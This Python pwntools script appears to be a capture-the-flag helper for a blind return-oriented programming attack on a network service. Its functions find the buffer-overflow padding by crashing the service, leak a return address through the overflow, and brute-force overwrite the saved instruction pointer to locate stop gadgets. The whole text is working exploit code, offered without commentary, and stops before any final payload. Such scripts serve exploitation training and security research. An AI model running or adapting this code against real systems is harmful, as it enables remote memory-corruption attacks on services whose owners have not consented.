#!/usr/bin/env python3

from pwn import *
from utils import connect, disconnect, debugInfo
from Crypto.Util.number import bytes_to_long

timeout = 0.1


def getPadding(debug=False):
    log.info('finding overflow size')
    i = 0 # counter

    while True:
        # connect to server and wait for prompt
        r = connect()
        r.recv(timeout=timeout)

        # send the growing buffer
        i += 1
        pld = b'X' * i
        r.send(pld)

        # check output
        try:
            output = r.recv(timeout=timeout)
            disconnect(r)
            if output:
                debugInfo(f'{i} -> {output}', debug)
        except:
            log.warn(f'overflow when padding size = {i}')
            return i-1 # -1 because we want the padding size


def leakAddr(pad):
    log.info('leaking return addr')
    c = b'X'
    pld = c * pad

    # connect to serv and send pld
    r = connect()
    r.recv(timeout=timeout)
    r.send(pld)

    # return addr leak
    leak = r.recv(timeout=timeout)
    addr = bytes_to_long(leak[leak.rfind(c) + 1:-5][::-1])
    return addr


def getStopGadget(pad, base_addr, ref):
    L = [] # found addresses
    start = 0x0
    end = start + 0x800

    for i in range(start, end):
        r = connect()

        try:
            # build payload
            addr = base_addr + i
            pld = b'X' * pad    # fill buffer
            pld += p64(addr)    # rip
            log.info(f'searching stop gadget, trying addr = {hex(addr)}')

            # send pld and check if ref is in output
            r.recv(timeout=timeout)
            r.send(pld)
            res = r.recv(timeout=timeout)
            if ref in res:
                L.append(addr) # this address is a stop gadget

        except: # we crashed, close socket and continue
            pass
        disconnect(r)

    return L # return a list of addresses
